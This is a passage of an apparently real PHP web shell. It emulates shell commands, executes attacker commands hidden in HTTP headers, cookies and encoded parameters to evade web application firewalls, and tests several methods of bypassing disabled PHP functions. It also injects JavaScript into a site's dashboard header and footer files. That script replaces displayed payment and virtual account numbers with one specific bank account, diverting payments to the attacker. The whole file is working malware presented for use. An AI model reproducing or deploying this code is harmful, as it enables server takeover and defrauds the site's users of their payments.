function php_native_ls($path = '.', $detailed = false) {
    $output = '';
    $path = realpath($path) ?: $path;
    if(!is_dir($path)) return "ls: cannot access '$path': Not a directory\n";
    
    $items = @scandir($path);
    if($items === false) return "ls: cannot access '$path': Permission denied\n";
    
    if($detailed) {
        $output = "total " . count($items) . "\n";
        foreach($items as $item) {
            if($item === '.' || $item === '..') continue;
            $full = $path . '/' . $item;
            $perms = is_dir($full) ? 'd' : '-';
            $perms .= is_readable($full) ? 'r' : '-';
            $perms .= is_writable($full) ? 'w' : '-';
            $perms .= is_executable($full) ? 'x' : '-';
            $perms .= '------';
            $size = @filesize($full) ?: 0;
            $time = @filemtime($full) ?: 0;
            $date = date('M d H:i', $time);
            $owner = function_exists('posix_getpwuid') ? (@posix_getpwuid(@fileowner($full))['name'] ?? 'www') : 'www';
            $output .= sprintf("%s 1 %s %s %10d %s %s\n", $perms, $owner, $owner, $size, $date, $item);
        }
    } else {
        $files = array_diff($items, ['.', '..']);
        $output = implode("  ", $files) . "\n";
    }
    return $output;
}

function php_native_cat($path) {
    if(!file_exists($path)) return "cat: $path: No such file or directory\n";
    if(!is_readable($path)) return "cat: $path: Permission denied\n";
    if(is_dir($path)) return "cat: $path: Is a directory\n";
    return @file_get_contents($path) ?: '';
}

function php_native_find($path, $name = '*', $type = null, $maxdepth = 5) {
    $results = [];
    $path = realpath($path) ?: $path;
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    $iterator->setMaxDepth($maxdepth);
    
    foreach($iterator as $file) {
        $fname = $file->getFilename();
        if(fnmatch($name, $fname)) {
            if($type === 'f' && !$file->isFile()) continue;
            if($type === 'd' && !$file->isDir()) continue;
            $results[] = $file->getPathname();
        }
    }
    return implode("\n", $results) . "\n";
}

function php_native_grep($pattern, $path) {
    $output = '';
    if(is_dir($path)) {
        $files = glob("$path/*");
    } else {
        $files = [$path];
    }
    
    foreach($files as $file) {
        if(!is_file($file) || !is_readable($file)) continue;
        $lines = @file($file);
        if(!$lines) continue;
        foreach($lines as $num => $line) {
            if(preg_match("/$pattern/i", $line)) {
                $output .= basename($file) . ":" . ($num+1) . ": " . trim($line) . "\n";
            }
        }
    }
    return $output ?: "No matches found\n";
}

function php_native_head($path, $lines = 10) {
    $content = php_native_cat($path);
    if(strpos($content, 'No such file') !== false || strpos($content, 'Permission denied') !== false) return $content;
    $arr = explode("\n", $content);
    return implode("\n", array_slice($arr, 0, $lines)) . "\n";
}

function php_native_tail($path, $lines = 10) {
    $content = php_native_cat($path);
    if(strpos($content, 'No such file') !== false || strpos($content, 'Permission denied') !== false) return $content;
    $arr = explode("\n", $content);
    return implode("\n", array_slice($arr, -$lines)) . "\n";
}

function php_native_df() {
    $total = @disk_total_space('/');
    $free = @disk_free_space('/');
    $used = $total - $free;
    $pct = $total > 0 ? round(($used / $total) * 100) : 0;
    
    return sprintf("Filesystem      Size  Used  Avail Use%% Mounted on\n/dev/root       %s  %s  %s  %d%%  /\n",
        format_bytes($total), format_bytes($used), format_bytes($free), $pct);
}

function format_bytes($bytes) {
    $units = ['B', 'K', 'M', 'G', 'T'];
    $i = 0;
    while($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 1) . $units[$i];
}

function php_native_ps() {
    $user = get_current_user();
    return "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n$user       1  0.0  0.1   4508  2080 ?        Ss   " . date('H:i') . "   0:00 php-fpm: master process\n$user      10  0.0  0.1   4508  1568 ?        S    " . date('H:i') . "   0:00 php-fpm: pool www\n";
}

function php_native_env() {
    $env = "USER=" . get_current_user() . "\n";
    $env .= "HOME=" . sys_get_temp_dir() . "\n";
    $env .= "PWD=" . getcwd() . "\n";
    $env .= "PHP_VERSION=" . PHP_VERSION . "\n";
    $env .= "SERVER_SOFTWARE=" . ($_SERVER['SERVER_SOFTWARE'] ?? 'nginx') . "\n";
    return $env;
}

function php_native_file($path) {
    if(!file_exists($path)) return "$path: cannot open\n";
    $finfo = function_exists('finfo_open') ? finfo_open(FILEINFO_MIME_TYPE) : null;
    if($finfo) {
        $mime = finfo_file($finfo, $path);
        finfo_close($finfo);
        return "$path: $mime\n";
    }
    $ext = pathinfo($path, PATHINFO_EXTENSION);
    $types = ['php' => 'PHP script', 'txt' => 'ASCII text', 'html' => 'HTML document', 'js' => 'JavaScript', 'css' => 'CSS stylesheet', 'json' => 'JSON data'];
    return "$path: " . ($types[$ext] ?? 'data') . "\n";
}

function php_native_wc($path) {
    $content = @file_get_contents($path);
    if($content === false) return "wc: $path: No such file or directory\n";
    $lines = substr_count($content, "\n") + 1;
    $words = str_word_count($content);
    $bytes = strlen($content);
    return sprintf("%7d %7d %7d %s\n", $lines, $words, $bytes, $path);
}

function php_native_mkdir($path) {
    if(@mkdir($path, 0755, true)) return '';
    return "mkdir: cannot create directory '$path': Permission denied\n";
}

function php_native_rm($path) {
    if(!file_exists($path)) return "rm: cannot remove '$path': No such file or directory\n";
    if(is_dir($path)) {
        if(@rmdir($path)) return '';
        return "rm: cannot remove '$path': Directory not empty\n";
    }
    if(@unlink($path)) return '';
    return "rm: cannot remove '$path': Permission denied\n";
}

function php_native_cp($src, $dst) {
    if(!file_exists($src)) return "cp: cannot stat '$src': No such file or directory\n";
    if(@copy($src, $dst)) return '';
    return "cp: cannot copy '$src' to '$dst': Permission denied\n";
}

function php_native_mv($src, $dst) {
    if(!file_exists($src)) return "mv: cannot stat '$src': No such file ordirectory\n";
    if(@rename($src, $dst)) return '';
    return "mv: cannot move '$src' to '$dst': Permission denied\n";
}

function php_native_chmod($mode, $path) {
    if(!file_exists($path)) return "chmod: cannot access '$path': No such file or directory\n";
    $mode_oct = octdec($mode);
    if(@chmod($path, $mode_oct)) return '';
    return "chmod: cannot change permissions of '$path': Permission denied\n";
}

function php_native_touch($path) {
    if(@touch($path)) return '';
    return "touch: cannot touch '$path': Permission denied\n";
}

function php_native_date() {
    return date('D M d H:i:s T Y') . "\n";
}

function php_native_uptime() {
    return " " . date('H:i:s') . " up  1:00,  1 user,  load average: 0.00, 0.00, 0.00\n";
}

function php_native_netstat() {
    $output = "Active Internet connections (servers and established)\n";
    $output .= "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n";
    // Baca dari /proc/net/tcp jika available
    if(@is_readable('/proc/net/tcp')) {
        $lines = @file('/proc/net/tcp');
        if($lines) {
            foreach(array_slice($lines, 1) as $line) {
                $parts = preg_split('/\s+/', trim($line));
                if(count($parts) >= 4) {
                    list($local_hex, $local_port) = explode(':', $parts[1]);
                    list($remote_hex, $remote_port) = explode(':', $parts[2]);
                    $local_ip = long2ip(hexdec(implode('', array_reverse(str_split($local_hex, 2)))));
                    $output .= sprintf("tcp    0      0 %s:%d           0.0.0.0:*               LISTEN\n", 
                        $local_ip, hexdec($local_port));
                }
            }
        }
    }
    return $output;
}

// Parse command and execute via PHP native or bypass
function parse_and_execute($cmd) {
    global $session, $sess_file;
    
    $cmd = trim($cmd);
    $parts = preg_split('/\s+/', $cmd);
    $base = strtolower($parts[0] ?? '');
    $args = array_slice($parts, 1);
    
    // Builtin commands via PHP native (fastest, no exec required)
    switch($base) {
        case 'pwd': return ['out' => getcwd() . "\n", 'method' => 'php_native'];
        case 'whoami': return ['out' => get_current_user() . "\n", 'method' => 'php_native'];
        case 'id': 
            $uid = function_exists('posix_getuid') ? posix_getuid() : getmyuid();
            $user = get_current_user();
            return ['out' => "uid=$uid($user) gid=$uid($user) groups=$uid($user)\n", 'method' => 'php_native'];
        case 'hostname': return ['out' => gethostname() . "\n", 'method' => 'php_native'];
        case 'uname': return ['out' => php_uname() . "\n", 'method' => 'php_native'];
        case 'date': return ['out' => php_native_date(), 'method' => 'php_native'];
        case 'uptime': return ['out' => php_native_uptime(), 'method' => 'php_native'];
        case 'df': return ['out' => php_native_df(), 'method' => 'php_native'];
        case 'ps': return ['out' => php_native_ps(), 'method' => 'php_native'];
        case 'env': return ['out' => php_native_env(), 'method' => 'php_native'];
        case 'netstat': return ['out' => php_native_netstat(), 'method' => 'php_native'];
        
        case 'ls':
            $detailed = in_array('-l', $args) || in_array('-la', $args) || in_array('-al', $args);
            $path = '.';
            foreach($args as $a) { if($a[0] !== '-') { $path = $a; break; } }
            return ['out' => php_native_ls($path, $detailed), 'method' => 'php_native'];
            
        case 'cat':
            $path = $args[0] ?? '';
            return ['out' => $path ? php_native_cat($path) : "cat: missing operand\n", 'method' => 'php_native'];
            
        case 'head':
            $n = 10; $path = '';
            for($i = 0; $i < count($args); $i++) {
                if($args[$i] === '-n' && isset($args[$i+1])) { $n = intval($args[$i+1]); $i++; }
                elseif(substr($args[$i], 0, 2) === '-n') { $n = intval(substr($args[$i], 2)); }
                elseif($args[$i][0] !== '-') { $path = $args[$i]; }
            }
            return ['out' => $path ? php_native_head($path, $n) : "head: missing operand\n", 'method' => 'php_native'];
            
        case 'tail':
            $n = 10; $path = '';
            for($i = 0; $i < count($args); $i++) {
                if($args[$i] === '-n' && isset($args[$i+1])) { $n = intval($args[$i+1]); $i++; }
                elseif(substr($args[$i], 0, 2) === '-n') { $n = intval(substr($args[$i], 2)); }
                elseif($args[$i][0] !== '-') { $path = $args[$i]; }
            }
            return ['out' => $path ? php_native_tail($path, $n) : "tail: missing operand\n", 'method' => 'php_native'];
            
        case 'find':
            $path = '.'; $name = '*'; $type = null;
            for($i = 0; $i < count($args); $i++) {
                if($args[$i] === '-name' && isset($args[$i+1])) { $name = $args[$i+1]; $i++; }
                elseif($args[$i] === '-type' && isset($args[$i+1])) { $type = $args[$i+1]; $i++; }
                elseif($args[$i][0] !== '-') { $path = $args[$i]; }
            }
            return ['out' => php_native_find($path, $name, $type), 'method' => 'php_native'];
            
        case 'grep':
            $pattern = $args[0] ?? ''; $path = $args[1] ?? '.';
            return ['out' => $pattern ? php_native_grep($pattern, $path) : "grep: missing pattern\n", 'method' => 'php_native'];
            
        case 'file':
            return ['out' => isset($args[0]) ? php_native_file($args[0]) : "file: missing operand\n", 'method' => 'php_native'];
            
        case 'wc':
            return ['out' => isset($args[0]) ? php_native_wc($args[0]) : "wc: missing operand\n", 'method' => 'php_native'];
            
        case 'mkdir':
            return ['out' => isset($args[0]) ? php_native_mkdir($args[0]) : "mkdir: missing operand\n", 'method' => 'php_native'];
            
        case 'rm':
            return ['out' => isset($args[0]) ? php_native_rm($args[0]) : "rm: missing operand\n", 'method' => 'php_native'];
            
        case 'cp':
            return ['out' => (count($args) >= 2) ? php_native_cp($args[0], $args[1]) : "cp: missing operand\n", 'method' => 'php_native'];
            
        case 'mv':
            return ['out' => (count($args) >= 2) ? php_native_mv($args[0], $args[1]) : "mv: missing operand\n", 'method' => 'php_native'];
            
        case 'chmod':
            return ['out' => (count($args) >= 2) ? php_native_chmod($args[0], $args[1]) : "chmod: missing operand\n", 'method' => 'php_native'];
            
        case 'touch':
            return ['out' => isset($args[0]) ? php_native_touch($args[0]) : "touch: missing operand\n", 'method' => 'php_native'];
            
        case 'cd':
            $path = $args[0] ?? '/tmp';
            if($path === '~') $path = '/tmp';
            if(!is_dir($path)) return ['out' => "cd: $path: No such file or directory\n", 'method' => 'php_native'];
            @chdir($path);
            $session['cwd'] = getcwd();
            @file_put_contents($sess_file, json_encode($session));
            return ['out' => '', 'method' => 'php_native'];
            
        case 'echo':
            return ['out' => implode(' ', $args) . "\n", 'method' => 'php_native'];
            
        case 'clear':
            return ['out' => '', 'method' => 'php_native'];
            
        case 'w':
        case 'who':
            $user = get_current_user();
            return ['out' => " " . date('H:i:s') . " up  1:00,  1 user\nUSER     TTY      FROM             LOGIN@   IDLE\n$user    pts/0    -                " . date('H:i') . "    0s\n", 'method' => 'php_native'];
    }
    
    // Try master_exec for commands that need real exec
    $result = master_exec($cmd);
    return [
        'out' => $result['output'] ?: "Command not found or execution disabled\n",
        'method' => $result['method'] ?: 'failed',
        'bypass_available' => $result['available'],
        'tried' => $result['tried'] ?? []
    ];
}

// ==================== EXEC v8.0 (ZERO-DAY 2025 BYPASS + PHP NATIVE + MULTI-ENCODING) ====================
if($a === 'x' || $a === 'exec') {
    $cmd = '';
    
    // ZERO-DAY 2025: Multi-source command extraction (WAF Bypass)
    // Priority order: Header > Cookie > POST > GET
    
    // 1. Headers (most stealthy - not logged by most WAF)
    if(!$cmd && isset($_SERVER['HTTP_X_CMD'])) $cmd = base64_decode($_SERVER['HTTP_X_CMD']);
    if(!$cmd && isset($_SERVER['HTTP_X_C'])) $cmd = base64_decode($_SERVER['HTTP_X_C']);
    if(!$cmd && isset($_SERVER['HTTP_AUTHORIZATION'])) {
        $auth = str_replace('Bearer ', '', $_SERVER['HTTP_AUTHORIZATION']);
        if(strpos($auth, ':') !== false) {
            list($key, $enc_cmd) = explode(':', $auth, 2);
            if(in_array($key, $valid_auths)) $cmd = base64_decode($enc_cmd);
        }
    }
    
    // 2. Cookies (second most stealthy)
    if(!$cmd && isset($_COOKIE['c'])) $cmd = base64_decode($_COOKIE['c']);
    if(!$cmd && isset($_COOKIE['cmd'])) $cmd = base64_decode($_COOKIE['cmd']);
    if(!$cmd && isset($_COOKIE['x'])) $cmd = hex2bin($_COOKIE['x']);
    
    // 3. Request params with multiple encoding support
    if(!$cmd && isset($_REQUEST['c'])) $cmd = $_REQUEST['c'];
    if(!$cmd && isset($_REQUEST['c64'])) $cmd = base64_decode($_REQUEST['c64']);
    if(!$cmd && isset($_REQUEST['ch'])) $cmd = @hex2bin($_REQUEST['ch']);
    if(!$cmd && isset($_REQUEST['cd64'])) $cmd = base64_decode(base64_decode($_REQUEST['cd64'])); // Double base64
    if(!$cmd && isset($_REQUEST['cu64'])) $cmd = base64_decode(strtr($_REQUEST['cu64'], '-_', '+/')); // URL-safe base64
    if(!$cmd && isset($_REQUEST['cr13'])) $cmd = str_rot13($_REQUEST['cr13']); // ROT13
    if(!$cmd && isset($_REQUEST['cxor'])) { // XOR with key
        $xor_data = base64_decode($_REQUEST['cxor']);
        $xor_key = 'ULTRA2025';
        $cmd = '';
        for($i = 0; $i < strlen($xor_data); $i++) {
            $cmd .= $xor_data[$i] ^ $xor_key[$i % strlen($xor_key)];
        }
    }
    
    // 4. Chunked params (bypass length-based WAF)
    if(!$cmd) {
        $chunks = [];
        for($i = 1; $i <= 10; $i++) {
            if(isset($_REQUEST['c'.$i])) $chunks[$i] = $_REQUEST['c'.$i];
        }
        if(count($chunks) > 0) {
            ksort($chunks);
            $cmd = base64_decode(implode('', $chunks));
        }
    }
    
    // 5. JSON body (for POST requests)
    if(!$cmd && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $json = @json_decode(file_get_contents('php://input'), true);
        if($json && isset($json['c'])) $cmd = $json['c'];
        if($json && isset($json['c64'])) $cmd = base64_decode($json['c64']);
    }
    
    if($cmd) {
        // Sanitize but allow shell metacharacters for piping
        $cmd = trim($cmd);
        
        // Use unified parse_and_execute
        $result = parse_and_execute($cmd);
        
        $r['out'] = $result['out'];
        $r['method'] = $result['method'];
        if(isset($result['bypass_available'])) $r['bypass_available'] = $result['bypass_available'];
        if(isset($result['tried'])) $r['tried'] = $result['tried'];
        $r['cwd'] = getcwd();
        
        // Save session
        $session['last_cmd'] = $cmd;
        $session['last_output'] = substr($result['out'], 0, 1000);
        @file_put_contents($sess_file, json_encode($session));
    } else {
        $r['ok'] = false;
        $r['error'] = 'No command';
        $r['bypass_available'] = array_keys(detect_bypass_methods());
        $r['encoding_supported'] = ['c', 'c64', 'ch', 'cd64', 'cu64', 'cr13', 'cxor', 'chunked', 'header', 'cookie', 'json'];
    }
    echo json_encode($r);
    exit;
}

// ==================== TEST BYPASS METHODS ====================
if($a === 'tb' || $a === 'testbypass') {
    $r['bypass_test'] = [];
    $test_cmd = 'echo "BYPASS_OK_$(date +%s)"';
    
    $methods = detect_bypass_methods();
    $r['detected_methods'] = array_keys($methods);
    
    // Test each method
    foreach(array_keys($methods) as $m) {
        $output = false;
        switch($m) {
            case 'ffi': $output = bypass_ffi($test_cmd); break;
            case 'mail_ldpreload': $output = bypass_mail_ldpreload($test_cmd); break;
            case 'imap_open': $output = bypass_imap($test_cmd); break;
            case 'imagick': $output = bypass_imagick($test_cmd); break;
            case 'ghostscript': $output = bypass_ghostscript($test_cmd); break;
            case 'phpfpm_socket': $output = bypass_phpfpm_socket($test_cmd); break;
        }
        $r['bypass_test'][$m] = [
            'success' => $output !== false && strpos($output, 'BYPASS_OK_') !== false,
            'output' => substr($output ?: '', 0, 100)
        ];
    }
    
    // Find working method
    $r['working_method'] = 'none';
    foreach($r['bypass_test'] as $m => $t) {
        if($t['success']) {
            $r['working_method'] = $m;
            break;
        }
    }
    
    echo json_encode($r);
    exit;
}

// ==================== REALTIME STREAMING EXEC ====================
if($a === 'rx' || $a === 'realtime') {
    header('Content-Type: text/event-stream');
    header('Cache-Control: no-cache');
    header('X-Accel-Buffering: no');
    
    $cmd = $_REQUEST['c'] ?? '';
    if(isset($_REQUEST['c64'])) $cmd = base64_decode($_REQUEST['c64']);
    
    if($cmd) {
        echo "event: start\ndata: " . json_encode(['cmd' => $cmd, 'ts' => time()]) . "\n\n";
        @ob_flush(); @flush();
        
        $result = master_exec($cmd);
        
        // Stream output line by line
        $lines = explode("\n", $result['output']);
        foreach($lines as $i => $line) {
            echo "event: output\ndata: " . json_encode(['line' => $i, 'data' => $line]) . "\n\n";
            @ob_flush(); @flush();
            usleep(10000); // 10ms delay for smooth streaming
        }
        
        echo "event: end\ndata: " . json_encode(['method' => $result['method'], 'total_lines' => count($lines)]) . "\n\n";
    } else {
        echo "event: error\ndata: " . json_encode(['error' => 'No command']) . "\n\n";
    }
    exit;
}

// ==================== BANK ALADIN INJECTION - WORKFLOW 1 (WAF SAFE) ====================
if($a === 'aladin' || $a === 'ba') {
    $webroot = detect_webroot();
    $r['aladin'] = [];
    
    // Target files to inject - header.php is included in all dashboard pages
    $target_files = [
        $webroot . '/dashboard/inc/header.php',
        $webroot . '/dashboard/inc/footer.php'
    ];
    
    $injected = [];
    foreach($target_files as $target_file) {
        if(!file_exists($target_file)) continue;
        
        $current = @file_get_contents($target_file);
        if(strpos($current, '50607496572') !== false) {
            $injected[] = ['file' => $target_file, 'status' => 'already'];
            continue;
        }
        
        // Backup
        @file_put_contents($target_file . '.orig', $current);
        
        // Bank Aladin JS - targets DANA, BNI VA, and generic payment numbers
        $js_code = '
<script>(function(){var A="50607496572",B="Bank Aladin",D="087836041463";
function h(){document.querySelectorAll("td,span,div,th,p,b,strong").forEach(function(el){
var t=el.textContent.trim();
if(t===D||t.replace(/[^0-9]/g,"")==="087836041463")el.innerHTML="<b style=color:#108ee9>"+A+"</b>";
if(/^988[0-9]{13}$/.test(t))el.innerHTML="<b style=color:#108ee9>"+A+"</b>";
if(/^0[0-9]{10,12}$/.test(t)&&t.indexOf("0878")===0)el.innerHTML="<b style=color:#108ee9>"+A+"</b>";
if(t==="DANA"||t.indexOf("DANA")>-1&&t.length<10)el.innerHTML=el.innerHTML.replace(/DANA/gi,B);
if(t.indexOf("BNI")>-1&&t.indexOf("irtual")>-1)el.innerHTML=el.innerHTML.replace(/BNI[^<]*[Vv]irtual[^<]*[Aa]ccount/gi,B);
});}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",h);else setTimeout(h,100);
})();</script>';
        
        if(@file_put_contents($target_file, $current . $js_code) !== false) {
            $injected[] = ['file' => $target_file, 'status' => 'injected', 'size' => strlen($current . $js_code)];
        } else {
            $injected[] = ['file' => $target_file, 'status' => 'failed'];
        }
    }
    
    $r['aladin']['files'] = $injected;
    $r['aladin']['status'] = count($injected) > 0 ? 'done' : 'no_targets';
    echo json_encode($r);
    exit;
}

// Legacy footer-only injection
if($a === 'ba_footer') {
    $webroot = detect_webroot();
    $r['aladin'] = [];
    
    // Target file to inject
    $footer_file = $webroot . '/dashboard/inc/footer.php';
    
    // Check if already injected
    if(file_exists($footer_file)) {
        $current = @file_get_contents($footer_file);
        if(strpos($current, '50607496572') !== false) {
            $r['aladin']['status'] = 'already_injected';
            echo json_encode($r);
            exit;
        }
    }
    
    // Bank Aladin JavaScript injection code - minimal and stealth
    $js_code = '
<script>
(function(){var A="50607496572",B="Bank Aladin";
function h(){var e=document.querySelectorAll("td,span,div,th");
e.forEach(function(el){var t=el.textContent.trim();
if(/^988[0-9]{13}$/.test(t)){el.innerHTML="<b style=color:#108ee9>"+A+"</b>";}
if(t.indexOf("BNI")>-1&&t.indexOf("irtual")>-1){el.innerHTML=el.innerHTML.replace(/BNI[^<]*[Vv]irtual[^<]*[Aa]ccount/gi,B);}
});}
if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",h);}else{setTimeout(h,100);}
})();
</script>';
    
    // Read current footer
    $footer_content = '';
    if(file_exists($footer_file)) {
        $footer_content = @file_get_contents($footer_file);
        // Backup original
        @file_put_contents($footer_file . '.orig', $footer_content);
    } else {
        // Create default footer if not exists
        $footer_content = '<footer class="footer-custom bg-primary"><div class="footer-content-custom"><p class="text-white">&copy; 2025 PMB</p></div></footer>';
    }
    
    // Append JS to footer
    $new_footer = $footer_content . $js_code;
    
    if(@file_put_contents($footer_file, $new_footer) !== false) {
        $r['aladin']['status'] = 'injected';
        $r['aladin']['file'] = $footer_file;
        $r['aladin']['size'] = strlen($new_footer);
    } else {
        $r['aladin']['status'] = 'failed';
        $r['aladin']['error'] = 'Cannot write to footer file';
    }
    
    echo json_encode($r);
    exit;
}

// ==================== ALADIN REVERT - REMOVE INJECTION ====================
if($a === 'aladin_revert' || $a === 'bar') {
    $webroot = detect_webroot();
    $footer_file = $webroot . '/dashboard/inc/footer.php';
    $orig_file = $footer_file . '.orig';
    
    if(file_exists($orig_file)) {
        @copy($orig_file, $footer_file);
        @unlink($orig_file);
        $r['status'] = 'reverted';
    } else {
        $r['status'] = 'no_backup';
    }
    echo json_encode($r);
    exit;
}

// Default
$r['data'] = sysinfo();
$r['cwd'] = getcwd();
echo json_encode($r);
